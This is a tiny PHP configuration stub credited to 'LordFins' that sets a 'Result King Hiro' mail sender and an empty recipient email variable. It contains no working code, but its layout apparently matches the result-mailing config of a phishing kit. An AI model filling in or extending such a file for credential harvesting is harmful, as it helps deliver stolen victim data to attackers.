<?php
//Reedit by LordFins
//WA: 

$sender = 'From: Result King Hiro <admin@hiro.id>';
$emailku = '';

?>